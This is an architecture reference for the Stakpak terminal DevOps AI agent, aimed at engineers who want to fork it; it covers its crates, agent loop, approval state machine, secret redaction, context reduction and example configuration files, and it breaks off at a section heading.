# Stakpak Agent — Architecture Reference for Mirroring

> Built from a deep file-by-file pass over `main` (480 files, ~177k LOC of Rust) plus a categorised survey of all 295 remote branches. The audience is an engineer who intends to **clone the architectural skeleton and re-skin it with different domain logic** — keep the runtime kernel, swap the tools, channels, prompts, and product surface.

---

## How to read this document

| Part | What's in it | Read first if you're… |
|---|---|---|
| **I. Product** | What Stakpak is, the security thesis, the user-visible modes | …new to the project |
| **II. System topology** | Processes, the 14-crate workspace map, configuration files | …trying to draw the architecture in your head |
| **III. Crate deep-dives** | One section per crate: types, traits, state machines, file:line refs | …about to modify or replace a specific layer |
| **IV. Cross-cutting flows** | End-to-end data paths that span multiple crates | …debugging or designing a feature that crosses layers |
| **V. Security model** | mTLS, secret redaction, sandboxing, command-level approvals | …mirroring the safety story |
| **VI. Build / release / deploy** | Toolchain, lint posture, CI matrix, Docker, release pipeline | …setting up your own fork |
| **VII. Branch landscape** | Where active development is happening on the 295 branches | …deciding which experimental feature to pull in |
| **VIII. Mirror playbook** | The seams to keep, the domain to replace, suggested sequencing | …deciding *how* to fork |

Every crate section ends with **Mirror Notes** (Domain / Framework / Seams). Every cross-cutting flow ends with the seam that lets you swap implementation without rewriting the whole path.

---

# PART I — PRODUCT

## 1. What Stakpak is

Stakpak is a **security-hardened DevOps AI agent that runs in the terminal**. It writes Terraform, debugs Kubernetes, configures CI/CD, and runs deployment commands — without giving the LLM the keys to production. Open source, Apache-2.0, single Rust binary (`stakpak`).

**Three things distinguish it from the typical chat-agent shape:**

1. **Secret substitution at the proxy boundary.** The LLM sees `[REDACTED_SECRET:rule:hash]` placeholders. The MCP proxy does the substitution back to the real value at tool-call execution time. No LLM call ever contains a real credential.
2. **Sub-tool-level command approvals.** Instead of approving the `run_command` tool wholesale, a tree-sitter-bash parser extracts each command in a pipeline, walks a hierarchical scope-resolution rule map (`scope::cmd::arg`), and applies the most restrictive policy across the whole script.
3. **Dual runtime surfaces around one kernel.** The same agent loop (`agent_core::run_agent`) drives the interactive TUI, the headless `--async` mode, the HTTP/SSE server, and the autopilot scheduler. The kernel knows nothing about transport.

## 2. The security thesis

Five layers, in order of when they fire:

1. **mTLS-by-default on the local MCP transport.** `rcgen` generates an in-memory CA + server cert + client cert at process startup. Keys never touch disk. `--disable-mcp-mtls` falls back to platform-CA TLS — strictly broader trust, called out in docs as not for production.
2. **Secret redaction on every tool result.** `gitleaks` rule set + entropy filter detect API keys, tokens, certificates. Detected secrets are replaced in-place with stable tokens (`[REDACTED_SECRET:rule:6char_id]`); the redaction map is persisted at `.stakpak/session/secrets.json` and accumulated across the session.
3. **Privacy mode** (`--privacy-mode`) adds IP addresses, AWS account IDs, and other PII patterns to the redaction set.
4. **Reversible file operations.** The `remove` tool *moves* files to `.stakpak/session/backups/{uuid}/` instead of deleting. `str_replace` and `create` overwrite — but the prior content can be reconstructed from checkpoint history.
5. **Warden sandbox** (optional). When `warden.enabled = true` in the active profile, the top-level agent invocation re-execs itself inside a Docker container with explicit volume mounts and an `STAKPAK_SKIP_WARDEN` env guard to prevent recursion.

The security model is composable: each layer is a single-flag override, no layer depends on another being enabled.

## 3. User-visible modes

| Mode | Invocation | Use case |
|---|---|---|
| **Interactive TUI** | `stakpak` (default) | Human-in-the-loop chat with full approval UX |
| **Async / headless** | `stakpak -a "do X"` or `--print` | Scripts, CI pipelines, one-shot tasks |
| **MCP server** | `stakpak mcp start --tool-mode {local,remote,combined}` | Expose tools to other agents (Claude Desktop, etc.) over stdio or HTTPS+mTLS |
| **MCP proxy** | `stakpak mcp proxy` | Multiplex multiple upstream MCPs into one endpoint, with redaction applied uniformly |
| **ACP (Zed editor)** | `stakpak acp` | JSON-RPC stdio agent for Zed and other ACP-compatible editors |
| **Autopilot service** | `stakpak up` (alias for `autopilot up`) | 24/7 background daemon: scheduled cron-based runs + Slack/Telegram/Discord channels |
| **Warden** | `stakpak warden` (sub-binary) | Containerised execution wrapper |
| **AK (knowledge store)** | `stakpak ak {search,read,write,remove,skill}` | Persistent agent knowledge across sessions |
| **Rulebooks** | `stakpak rb {get,apply,delete}` | Org-level SOPs/playbooks loaded into agent context |

The CLI dispatches to one of two long-lived runtimes (`run_interactive` or `run_async`) for "agent" work, or exits after one-shot subcommand work. Plugin commands (`warden`, `board`, `browser`) auto-download from GitHub Releases on first use.

## 4. Lifecycle in one diagram

```
                       stakpak (one binary)
                              │
        ┌─────────────────────┼─────────────────────┐
        │                     │                     │
   one-shot                long-lived           sub-binary
   subcommands              runtimes             wrappers
        │                     │                     │
   auth, config,         interactive TUI         warden,
   sessions, ak,         async mode              board,
   mcp add/list/...      mcp start (HTTP+mTLS)   browser
   autopilot CRUD        mcp proxy
                         acp
                         autopilot service
                         (server + gateway +
                          scheduler in-process)
```

`stakpak up` and `stakpak autopilot up` install an OS service (launchd / systemd / Windows SCM) that re-invokes the binary with the hidden `--from-service` flag and runs the autopilot supervisor in `--foreground`. The supervisor hosts three child runtimes in the same process:

- **Server** (`stakpak-server`) — Axum HTTP/SSE on `127.0.0.1:4096`
- **Gateway** (`stakpak-gateway`) — Slack/Telegram/Discord adapters
- **Scheduler** (`cli/src/commands/watch/scheduler.rs`) — cron loop that spawns `stakpak --async` child processes per schedule trigger

---

# PART II — SYSTEM TOPOLOGY

## 5. Workspace map (14 crates)

```
agent/                                         (workspace root, version 0.3.78)
├── cli/                stakpak                Main binary; clap-driven dispatch
├── tui/                stakpak-tui            ratatui terminal UI
├── libs/
│   ├── shared/         stakpak-shared         Domain-neutral types: messages, hooks, secrets
│   ├── api/            stakpak-api            SessionStorage + AgentState + 3 context managers
│   ├── ai/             stakai                 Provider-agnostic LLM SDK (OpenAI/Anthropic/Gemini/Bedrock/Copilot)
│   ├── agent-core/     stakpak-agent-core     ★ CANONICAL AGENT LOOP ★ run_agent + 3 traits
│   ├── server/         stakpak-server         Axum HTTP/SSE shell around agent-core
│   ├── gateway/        stakpak-gateway        Slack/Telegram/Discord bridge
│   ├── ak/             stakpak-ak             File-backed knowledge store
│   ├── shell-tool-approvals/  stakpak-shell-tool-approvals  tree-sitter-bash command parser
│   └── mcp/
│       ├── client/     stakpak-mcp-client     stdio + HTTPS+mTLS MCP client
│       ├── server/     stakpak-mcp-server     Tool host (file ops, run_command, etc.)
│       ├── proxy/      stakpak-mcp-proxy      Multiplexer over upstream MCPs + redaction
│       └── config/     stakpak-mcp-config     mcp.toml/mcp.json schema + CRUD
```

**Default-members = ["cli"]** — `cargo build` and `cargo run` only build the binary unless you pass `--workspace`.

## 6. Crate dependency graph

```
                              ┌──────────────────┐
                              │       cli        │  (binary)
                              └─┬───┬───┬───┬────┘
                                │   │   │   │
            ┌───────────────────┘   │   │   └───────────────────┐
            │                       │   │                       │
            ▼                       ▼   ▼                       ▼
      ┌─────────┐         ┌──────────────────┐         ┌────────────────┐
      │   tui   │         │  agent runtime   │         │   autopilot    │
      └────┬────┘         │  (in cli/agent/) │         │  schedules +   │
           │              └──┬────────────┬──┘         │   channels     │
           │                 │            │            └───────┬────────┘
           │                 ▼            ▼                    │
           │           ┌──────────┐  ┌──────────┐              │
           └──────────►│  shared  │  │   api    │◄─────────────┘
                       └────┬─────┘  └────┬─────┘
                            │              │
                            ▼              ▼
                       ┌─────────────────────────┐
                       │       agent-core        │  ★ THE KERNEL ★
                       └────────────┬────────────┘
                                    │
                                    ▼
                            ┌──────────────┐
                            │   stakai     │  (libs/ai)
                            │  (LLM SDK)   │
                            └──────────────┘

  ┌──────────┐       ┌──────────────┐       ┌──────────────┐
  │  server  │──────►│  agent-core  │       │   gateway    │──┐
  └────┬─────┘       └──────────────┘       └──────────────┘  │
       │                     ▲                                │
       │                     │                                │
       └─────────────────────┴────────────── reuses run_agent ┘

  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
  │ mcp/config   │◄───│  mcp/proxy   │───►│  mcp/server  │    │  mcp/client  │
  └──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
                              ▲                                       ▲
                              │                                       │
                              └─── used by cli + server + gateway ────┘

  ┌────────┐                            ┌─────────────────────────┐
  │   ak   │ ── used by cli (commands)  │ shell-tool-approvals    │ ── used by tui
  └────────┘                            └─────────────────────────┘
```

The arrows show "uses". `agent-core` and `stakai` are the only two crates everything in the agent-execution path goes through; `shared` is imported by virtually every other crate for the message types.

## 7. Configuration files

Three TOML files are the entire user-visible configuration surface.

### `~/.stakpak/config.toml` — behaviour profiles

The source of truth for per-profile behaviour. Schema (Rust): `cli/src/config/file.rs:15` (`ConfigFile`), `cli/src/config/profile.rs:39` (`ProfileConfig`).

```toml
[profiles.default]                      # any name; "all" is reserved as global defaults
api_endpoint = "https://apiv2.stakpak.dev"
api_key = "sk-..."                      # Stakpak API key (or per-provider auth below)
provider = "remote"                     # "remote" (Stakpak proxy) | "local" (BYOK)
model = "anthropic/claude-sonnet-4-5"   # provider/model_id format
allowed_tools = ["view", "search_docs", "run_command"]
auto_approve = ["view", "search_docs"]
system_prompt = "You are ..."
max_turns = 64                          # 1..=256
recent_models = ["anthropic/sonnet-4-5", "openai/gpt-5"]   # max 5

[profiles.default.providers.anthropic]  # BYOK alternative to api_key
type = "anthropic"
api_key = "sk-ant-..."

[profiles.default.providers.offline]    # Custom OpenAI-compatible endpoint
type = "custom"
api_endpoint = "http://localhost:11434/v1"

[profiles.default.warden]
enabled = false
volumes = ["./:/agent"]

[profiles.default.rulebooks]
include = ["stakpak://my-org/*"]
exclude_tags = ["draft"]

[settings]
machine_name = "my-laptop"
auto_append_gitignore = true
anonymous_id = "..."                     # telemetry
collect_telemetry = true
editor = "code"
```

Profile resolution: `cli/src/config/file.rs:79 resolved_profile_config` merges `profiles.all` (defaults) into `profiles.<name>` (override). The string `"all"` cannot be used as a profile name when invoking — it panics at `cli/src/config/app.rs:402`.

### `~/.stakpak/autopilot.toml` — runtime wiring

Schedules, channels, server settings. Schema: `cli/src/commands/watch/config.rs:18` (`ScheduleConfig`).

```toml
[server]
listen = "127.0.0.1:4096"
sandbox_mode = "persistent"             # "persistent" | "ephemeral"

[watch]
db_path = "~/.stakpak/autopilot/runs.db"
log_dir = "~/.stakpak/autopilot/logs"

[defaults]
profile = "monitoring"
timeout = "30m"
check_timeout = "30s"
sandbox = true
pause_on_approval = false
trigger_on = "any"                      # "success" | "failure" | "any"

[notifications]
gateway_url = "http://127.0.0.1:4096"
channel = "slack"
chat_id = "C123"
notify_on = ["failure"]

[[schedules]]
name = "health-check"
cron = "*/5 * * * *"
prompt = "Check production health and report anomalies"
profile = "monitoring"
check = "~/.stakpak/checks/health.sh"   # optional pre-flight script

[channels.slack]
bot_token  = "xoxb-..."
app_token  = "xapp-..."                 # required for Socket Mode (inbound)
profile    = "ops"
auto_approve = ["view", "run_command"]  # deprecated; prefer profile-level auto_approve

[channels.telegram]
token = "..."

[channels.discord]
token = "..."

[gateway]
store_path = "~/.stakpak/autopilot/gateway.db"
title_template = "{channel}: {chat_type} {chat_id}"
prune_after_hours = 168                 # 1 week
delivery_context_ttl_hours = 4
approval_mode = "AllowAll"              # AllowAll | DenyAll | Allowlist
approval_allowlist = ["view"]

[routing]
dm_scope = "per_channel_peer"           # main | per_peer | per_channel_peer

[[routing.bindings]]
channel = "slack"
peer_id = "U12345"
routing_key = "vip-user"                # collapse this user's DMs to a fixed session
```

### `~/.stakpak/mcp.toml` (or `mcp.json`) — external MCP servers

Schema: `libs/mcp/config/src/lib.rs:26` (`McpConfigFile`).

```toml
[servers.context7]                      # untagged enum: command vs url discriminates
command = "npx"
args = ["-y", "@upstash/context7-mcp"]
env = { MCP_API_KEY = "..." }
disabled = false

[servers.github]
url = "https://api.githubcopilot.com/mcp"
headers = { Authorization = "Bearer ${GITHUB_TOKEN}" }
```

Discovery order (`libs/mcp/config/src/lib.rs:108`): `./mcp.toml` → `./.stakpak/mcp.toml` → `~/.stakpak/mcp.toml`. Reserved names: `stakpak` and `paks` (auto-injected by the proxy).

---

# PART III — CRATE-BY-CRATE DEEP DIVES

## 8. `stakpak-agent-core` — THE CANONICAL AGENT LOOP

**Role**: Transport-agnostic multi-turn agent runtime. Owns context reduction, streaming inference, approval-gated tool execution, retry/backoff, compaction on overflow, checkpoint serialisation, and a structured event bus. Host runtimes (`server`, `cli`) plug in three traits and call one function: `run_agent`.

### Public API (the embed contract)

`libs/agent-core/src/lib.rs` re-exports:

| Symbol | Kind |
|---|---|
| `run_agent` | `async fn` — the entire loop |
| `ApprovalStateMachine`, `ApprovalError`, `ResolvedToolCall` | Approval FSM |
| `BudgetAwareContextReducer` | Token-budget reducer |
| `CheckpointEnvelopeV1`, `serialize_checkpoint`, `deserialize_checkpoint`, `CHECKPOINT_VERSION_V1` | Persistence |
| `CompactionEngine`, `CompactionResult`, `PassthroughCompactionEngine` | Compaction seam |
| `ContextReducer`, `DefaultContextReducer`, `reduce_context` | Context seam |
| `AgentError`, `AgentHook` | Errors + observability seam |
| `RetryDelay`, `exponential_backoff_ms`, `parse_retry_delay_from_headers`, `resolve_retry_delay_ms` | Retry |
| `IndexedStreamEvent`, `OrderedContentPart`, `assemble_ordered_content` | Stream assembly |
| `ToolExecutionResult`, `ToolExecutor` | Execution seam |
| `AgentCommand`, `AgentConfig`, `AgentEvent`, `AgentLoopResult`, `AgentRunContext`, `CompactionConfig`, `ContextConfig`, `ProposedToolCall`, `RetryConfig`, `StopReason`, `ToolApprovalAction`, `ToolApprovalPolicy`, `ToolDecision`, `TurnFinishReason`, `SAFE_AUTOPILOT_TOOLS`, `strip_tool_prefix`, `TokenUsage` | Core types |

### Key types

| Type | File:Line | Role |
|---|---|---|
| `AgentConfig` | `types.rs:15` | All static run params: model, system prompt, max_turns, max_output_tokens, provider_options, tool_approval policy, retry, compaction, tool list |
| `AgentRunContext` | `types.rs:9` | Per-run identity: `run_id: Uuid`, `session_id: Uuid`; threaded through hooks and executor |
| `AgentCommand` | `types.rs:295` | Inbound channel: `ResolveTool`, `ResolveTools`, `Steering`, `FollowUp`, `SwitchModel`, `Cancel` |
| `AgentEvent` | `types.rs:346` | Outbound channel: 17 variants — run lifecycle, text/thinking deltas, tool lifecycle, retry, compaction, usage |
| `AgentLoopResult` | `types.rs:441` | Return from `run_agent`: run_id, turns, usage, stop_reason, full message history, metadata blob |
| `RetryConfig` | `types.rs:41` | `max_attempts`=3, `initial_backoff_ms`=2000, `max_backoff_ms`=30000, `multiplier`=2.0 |
| `CompactionConfig` | `types.rs:60` | Single field `enabled: bool`; default `true` |
| `CheckpointEnvelopeV1` | `checkpoint.rs:10` | `{ version: u16, format: String, run_id, messages: Vec<stakai::Message>, metadata: Value }` |
| `ToolApprovalPolicy` | `types.rs:71` | `None` (always Ask) \| `All` (always Approve) \| `Custom { rules: HashMap<String, ToolApprovalAction>, default }` |
| `ToolApprovalAction` | `types.rs:262` | `Approve < Ask < Deny` (security-ordered manual `Ord`) |
| `ToolDecision` | `types.rs:309` | `Accept` \| `Reject` \| `CustomResult { content: String }` |
| `ProposedToolCall` | `types.rs:337` | `id`, `name`, `arguments: Value`, `metadata: Option<Value>` (Gemini thought_signature etc.) |
| `ToolExecutionResult` | `tools.rs:6` | `Completed { result: String, is_error: bool }` \| `Cancelled` |

### Key traits (the seams for variation)

| Trait | Methods | Default? | Implementors in main |
|---|---|---|---|
| `ToolExecutor` (`tools.rs:12`) | `async fn execute_tool_call(run, call, cancel) -> Result<ToolExecutionResult>` | No | `gateway::dispatcher`, `cli::tooling::run_tool_call` |
| `AgentHook` (`hooks.rs:6`) | `before_inference`, `after_inference`, `before_tool_execution`, `after_tool_execution`, `on_error` (all async, all return `Result<()>`) | Yes (no-op) | `server::ServerCheckpointHook`, `api::TaskBoardContextHook` |
| `CompactionEngine` (`compaction.rs:14`) | `async fn compact(messages, model) -> Result<CompactionResult>` | Yes: `PassthroughCompactionEngine` (no-op) | `server` (LLM-summarisation impl) |
| `ContextReducer` (`context.rs:8`) | `fn reduce(messages, model, max_output_tokens, tools, metadata) -> Vec<Message>` | Yes: `DefaultContextReducer` | `BudgetAwareContextReducer` |
| `stakai::Inference` | Concrete struct (not trait) | — | Passed by reference into `run_agent` |

### The `run_agent` loop

```
run_agent() called
│
├─ Prepend system prompt if missing
├─ Push initial user message
├─ emit RunStarted
│
└─ 'run_loop: loop
    │
    ├─ drain_runtime_commands_nonblocking()    ← poll command_rx
    │   (buffer Steering/FollowUp/SwitchModel/Cancel/pending decisions)
    │
    ├─ if cancelled → emit RunCompleted(Cancelled), return
    ├─ flush steering queue → push User messages
    ├─ if total_turns ≥ max_turns → RunCompleted(MaxTurns), return
    │
    ├─ total_turns += 1; emit TurnStarted
    │
    └─ INFERENCE RETRY LOOP (attempt = 0..)
        │
        ├─ context_reducer.reduce(messages, model, max_output_tokens, tools, metadata)
        │   → reduced_messages
        │
        ├─ hooks[*].before_inference(run, reduced, model)
        │
        ├─ inference.generate(request)
        │   ├─ OK(response) → break
        │   └─ Err
        │       ├─ compaction.enabled && is_context_overflow_error?
        │       │   → emit CompactionStarted; compactor.compact(messages, model)
        │       │   → messages = compacted; emit CompactionCompleted
        │       │   → total_turns -= 1; continue 'run_loop
        │       ├─ attempt < max_attempts? → emit RetryAttempt; sleep; continue
        │       └─ exhausted → hooks.on_error; emit RunError; return Err
        │
        ├─ Accumulate response.content:
        │   Text → assistant_parts, emit TextDelta
        │   Reasoning → thinking_text
        │   ToolCall → assistant_parts, proposed_tool_calls
        │
        ├─ Push Assistant message
        ├─ hooks[*].after_inference(run, messages, model)
        ├─ emit ThinkingDelta (if any), TextComplete, UsageReport
        │
        ├─ IF proposed_tool_calls non-empty:
        │   ├─ emit ToolCallsProposed, WaitingForToolApproval
        │   ├─ run_tool_cycle(...)
        │   │   ├─ Cancelled → emit TurnCompleted(Cancelled), RunCompleted, return
        │   │   └─ Completed → emit TurnCompleted(ToolCalls); continue 'run_loop
        │
        ├─ emit TurnCompleted(finish_reason)
        ├─ IF follow_up queue non-empty → push User; continue 'run_loop
        └─ emit RunCompleted; return Ok(AgentLoopResult)
```

### `run_tool_cycle` (inside the turn)

```
Build ApprovalStateMachine from proposed_tool_calls + policy
   (auto-Approve / auto-Deny resolved immediately from policy)
Apply pre-buffered pending_tool_decisions
loop:
    ├─ cancel? → append_cancelled_placeholders; return Cancelled
    ├─ steering queue non-empty? → append_skipped_due_to_steering; return Completed
    ├─ approvals.next_ready()?
    │   Accept → emit ToolExecutionStarted; hooks.before_tool_execution
    │            tools.execute_tool_call(run, call, cancel)
    │            → Cancelled: append "TOOL_CALL_CANCELLED"; cancel remaining; return Cancelled
    │            → Completed: append_tool_result_message; emit ToolExecutionCompleted
    │            → hooks.after_tool_execution
    │   Reject → append "Tool call rejected"; emit ToolRejected
    │   Custom → append content; emit ToolExecutionCompleted
    │   drain_runtime_commands_nonblocking; continue
    ├─ approvals.is_complete()? → return Completed
    └─ blocking command_rx.recv():
        ResolveTool/Tools → apply to FSM (or buffer if not current turn's ids)
        Steering/FollowUp/SwitchModel/Cancel → queue/apply
```

### Approval state machine (`approval.rs`)

`ApprovalStateMachine` holds `entries: Vec<ApprovalEntry>` and `next_index: usize`. Entry states (`approval.rs:7`):

- `PendingUserDecision` — awaiting external `ResolveTool`
- `Ready(ToolDecision)` — recorded, not yet dispatched
- `Dispatched` — emitted by `next_ready`, pointer advanced

**`next_ready()`** (`approval.rs:138`) scans from `next_index`, **stops at first `PendingUserDecision`** (declaration order is preserved). Out-of-order resolutions (resolve id 2 before id 1) are stored in `Ready` but cannot overtake an unresolved earlier tool. **Idempotency** (`approval.rs:129`): re-resolving same decision on `Ready` is `Ok(())`; conflict returns `AlreadyResolved`.

### Context reduction pipeline (`context.rs:49`)

`reduce_context()` is six pure passes in order:

1. **`dedup_tool_results`** (`context.rs:58`) — keep only last `ToolResult` per `tool_call_id`. Removes stale retried results.
2. **`merge_consecutive_same_role`** (`context.rs:93`) — fold adjacent same-role messages into one. Required because Anthropic rejects multiple consecutive user messages and `role=tool` maps to `user`.
3. **`truncate_old_tool_results`** (`context.rs:115`) — retain last `keep_last_n` tool result parts.
4. **`truncate_old_assistant_messages`** (`context.rs:162`) — retain text of only last `keep_last_n` assistant messages; older ones get text replaced with `"[assistant message truncated]"` and reduced to `ToolCall` parts (skeleton preserved).
5. **`strip_dangling_tool_calls`** (`context.rs:214`) — if assistant message has `ToolCall` parts but next message lacks matching `ToolResult`, strip all `ToolCall` parts from that assistant message.
6. **`remove_orphaned_tool_results`** (`context.rs:267`) — collect all `ToolCall` ids; drop any `ToolResult` whose `tool_call_id` isn't in that set.

### Budget-aware reducer (`budget_context.rs`)

`BudgetAwareContextReducer` runs passes 1–4, then adds **token-budget trimming**: replaces `text` and `tool_result.content` with `"[trimmed]"` for older Assistant/Tool messages until estimated tokens fall below `context_window × threshold × 0.75`.

**Cache stability invariant** (`budget_context.rs:13, 228`): the `trimmed_up_to_message_index` key in `metadata` is **monotonically non-decreasing** (`candidate.max(prev_trimmed_up_to)`). This guarantees Anthropic prompt-cache prefixes never invalidate. **System and User messages are never trimmed** (`budget_context.rs:183, 199`).

Constants: `BYTES_PER_TOKEN = 3.0` (conservative vs Anthropic's 3.5), image flat cost = 2000 tokens, per-message overhead = 8 tokens, per-part overhead = 3 tokens, ToolCall/Result structural overhead = +30 bytes, final 5% safety buffer.

### Retry policy (`retry.rs`)

`exponential_backoff_ms(config, attempt)` = `initial_backoff_ms × multiplier^(attempt-1)`, clamped to `max_backoff_ms`.

`resolve_retry_delay_ms` (`retry.rs:82`) checks provider response headers first: `retry-after-ms` (highest priority) → `retry-after` (seconds or RFC2822 HTTP date). Falls back to formula.

Context-overflow errors **short-circuit to compaction** (`agent.rs:193`) when `compaction.enabled` is true — they don't consume retry attempts.

### Compaction contract (`compaction.rs`)

Triggered when inference error message matches case-insensitive: `{context|token} AND {overflow|maximum|too long|limit}` (`agent.rs:849`).

Engine receives full `messages` + current `model`, returns `CompactionResult { messages, tokens_before, tokens_after, truncated }`. Runtime replaces buffer entirely, decrements `total_turns` by 1 (don't count failed attempt), continues outer loop.

### Checkpoint envelope (`checkpoint.rs`)

V1 schema (`checkpoint.rs:10`):
```rust
CheckpointEnvelopeV1 {
    version:  u16,                     // = CHECKPOINT_VERSION_V1 (1)
    format:   String,                  // = "stakai_message_v1"
    run_id:   Option<Uuid>,
    messages: Vec<stakai::Message>,
    metadata: serde_json::Value,       // includes "trimmed_up_to_message_index"
}
```

Serialise: `serde_json::to_vec`. Deserialise: parse `version` first; missing → `migrate_legacy_checkpoint` (handles bare-array legacy and `{run_id, messages, metadata}` without version).

### Stream assembly (`stream.rs:145`)

`assemble_ordered_content(events)` uses `BTreeMap<usize, ContentSlot>` keyed by `content_index`. **BTreeMap → sorted iteration → final Vec is content-index-ordered regardless of arrival order.** Type mismatch at same index → `ContentTypeMismatch`. Tool args buffered as strings, parsed as JSON only at finalisation.

### Hooks (`hooks.rs`)

Five points, all `async_trait`, all default `Ok(())`:

1. `before_inference` — receives `reduced_messages`, `model` (after context reduction)
2. `after_inference` — receives full `messages` (after assistant turn appended) — **suitable for checkpoint writes**
3. `before_tool_execution` — per tool call after Accept, before executor
4. `after_tool_execution` — after executor returns Completed and result appended
5. `on_error` — only on terminal inference failure (post-retry)

Hooks **cannot mutate** the message list (received as `&[Message]`). They signal abort via `Err(AgentError)` which propagates immediately.

### Error taxonomy (`error.rs:4`)

| Variant | Source | Retryable |
|---|---|---|
| `Approval(_)` | FSM contract violation | No |
| `Checkpoint(_)` | Serialisation/version | No |
| `StreamAssembly(_)` | Type mismatch / bad JSON | No |
| `Inference(String)` | Provider after retry exhaustion | No (already retried) |
| `Hook(String)` | Hook returned `Err` | Depends on hook |
| `Compaction(String)` | CompactionEngine failure | No |
| `ToolExecution(String)` | ToolExecutor `Err` | No |
| `InvalidCommand(String)` | Malformed AgentCommand | No |
| `Cancelled` | CancellationToken | No |

### Invariants the runtime depends on

1. Every `ToolCall` declared in one turn ends with exactly one terminal `ToolResult` before next inference. Guaranteed by `append_cancelled_placeholders` on cancel and `append_skipped_due_to_steering` on steering.
2. Tool decisions can arrive out of order, **but execution stays in declaration order** via `next_index` cursor.
3. Retry attempts strictly bounded by `RetryConfig.max_attempts`.
4. Compaction and retry mutually exclusive for overflow errors.
5. `truncate_old_assistant_messages` preserves `ToolCall` skeletons; `strip_dangling_tool_calls` repairs broken pairs. **Two-pass contract is load-bearing.**
6. `User`/`System` messages **never trimmed** by `BudgetAwareContextReducer`.
7. `trimmed_up_to_message_index` monotonically non-decreasing across calls.
8. `ToolApprovalAction` ordering: `Deny > Ask > Approve`. `max()` across pipeline commands wins.

### Mirror Notes

- **Domain-specific**: `SAFE_AUTOPILOT_TOOLS`, `DEFAULT_ASK_TOOLS`, `DEFAULT_AUTO_APPROVE_TOOLS` lists (`types.rs:80-117`); `is_context_overflow_error` keyword set (provider-dependent); `BYTES_PER_TOKEN = 3.5`.
- **Framework**: The `run_tool_cycle` / `run_agent` split, `RuntimeQueues`, blocking `command_rx.recv()` under tool cycle, non-blocking drain at top. `ApprovalStateMachine.next_index` cursor. `BTreeMap` ordering in `assemble_ordered_content`. Six-pass context reduction order — **passes are not commutative**. Monotonic trim boundary. `total_turns.saturating_sub(1)` on compaction.
- **Seams**: `ToolExecutor`, `AgentHook`, `CompactionEngine`, `ContextReducer`, `stakai::Inference`. Implementing `ToolExecutor` is how you swap the entire tool-dispatch plane (MCP, local, mock). Implementing `CompactionEngine` is how you swap the summarisation strategy.

### Essential files

`agent.rs`, `types.rs`, `approval.rs`, `context.rs`, `budget_context.rs`, `tools.rs`, `hooks.rs`, `compaction.rs`, `error.rs`, `checkpoint.rs`, `retry.rs`, `stream.rs`, `lib.rs`.

---

## 9. `stakpak-shared` + `stakpak-api` — typed message substrate

### Purpose

- **`stakpak-shared`** — domain-neutral type library for the entire workspace. Owns canonical message hierarchy, provider configs, hook lifecycle, secret detection/redaction, OAuth flows, JWT, paths, local store, TLS.
- **`stakpak-api`** — session and checkpoint substrate. `SessionStorage` trait + libsql `LocalStorage` + remote `StakpakStorage`, `CheckpointState` shape, `AgentState`, **three context-manager strategies**, hook implementations.

### `stakpak-shared` — message type hierarchy

The hierarchy has **two parallel tracks**: an **OpenAI-shaped wire format** (storage) and an **internal LLM type** (inference).

#### `ChatMessage` (`libs/shared/src/models/integrations/openai.rs:243`)

```rust
ChatMessage {
    role: Role,                         // System | Developer | User | Assistant | Tool
    content: Option<MessageContent>,
    tool_calls: Option<Vec<ToolCall>>,
    tool_call_id: Option<String>,
    usage: Option<LLMTokenUsage>,
    id, model, cost, finish_reason, created_at, completed_at, metadata: optional
}

MessageContent =                       // #[serde(untagged)]
    | String(String)
    | Array(Vec<ContentPart>)

ContentPart { type, text: Option<String>, image_url }
ToolCall { id, type, function: FunctionCall { name, arguments: String } }
```

This is the **persistence format** in `CheckpointState.messages`.

#### `LLMMessage` (`libs/shared/src/models/llm.rs:781`)

```rust
LLMMessage {
    role: String,
    content: LLMMessageContent,
}

LLMMessageContent =                    // #[serde(untagged)]
    | String(String)
    | List(Vec<LLMMessageTypedContent>)

LLMMessageTypedContent =               // #[serde(tag = "type")]
    | Text       { text: String }
    | ToolCall   { id, name, args: serde_json::Value, metadata: Option<Value> }
    | ToolResult { tool_use_id, content: String }
    | Image      { source: LLMMessageImageSource { type, media_type, data } }
```

#### Conversion to `stakai::Message`

`to_stakai_message()` (`libs/shared/src/models/stakai_adapter.rs:24`):
- Role string → `stakai::Role` enum
- `LLMMessageContent::String` → `MessageContent::Text`
- `LLMMessageContent::List` → each part via `to_stakai_content_part()`
- `ToolCall` → `ContentPart::tool_call(id, name, args)` (preserving opaque `metadata`)
- `ToolResult` → `ContentPart::tool_result(id, json_value)`
- `Image` → `data:media_type;base64,…` URI

### Provider config types (`models/llm.rs:101`)

`ProviderConfig` is a discriminated union (`#[serde(tag = "type")]`):

| Variant | Auth fields | Notable |
|---|---|---|
| `OpenAI` | `api_key?`, `auth?: ProviderAuth` | OAuth via JWT decode for ChatGPT account ID |
| `Anthropic` | `api_key?`, `access_token?` (legacy), `auth?` | OAuth bearer vs API key |
| `Gemini` | `api_key?`, `auth?` | |
| `Custom` | `api_key?`, `api_endpoint` (required) | Registered under config key (e.g. "litellm") |
| `Stakpak` | `api_key?`, `auth?`, `api_endpoint?` | Routes through Stakpak proxy |
| `Bedrock` | none — AWS credential chain | `region` required |
| `GitHubCopilot` | `auth?` | Device flow OAuth |

`LLMProviderConfig` (`llm.rs:659`) = `{ providers: HashMap<String, ProviderConfig> }`. **HashMap key = model prefix for routing** (e.g. key `"offline"` → model `"offline/llama3"`).

### Secret detection / redaction

Entry: `redact_secrets(content, path, old_redaction_map, privacy_mode)` at `libs/shared/src/secrets/mod.rs:36`.

Pipeline:
1. `detect_secrets()` runs gitleaks rule set (`gitleaks.toml` + `additional_rules.toml` + `privacy_rules.toml`)
2. Each rule: regex + optional Shannon entropy ≥ 3.5 bits + keyword pre-filter + per-rule allowlist
3. Detected secrets dedup (longest match wins on overlap)
4. In-place replacement with `[REDACTED_SECRET:rule_id:6char_id]`
5. Redaction map = `HashMap<token, original_value>` accumulated across calls (`old_redaction_map` keeps tokens stable, cache-friendly)

`SecretManager` (`secret_manager.rs:9`) persists to `{session_dir}/secrets.json` via `LocalStore`.

Three modes:
- **Default**: regex + entropy + keyword from `gitleaks.toml`
- **`--privacy-mode`**: + `privacy_rules.toml` (IPs, AWS account IDs, etc.)
- **`--disable-secret-redaction`**: skips entire pipeline

### Hooks subsystem (`libs/shared/src/hooks/mod.rs`)

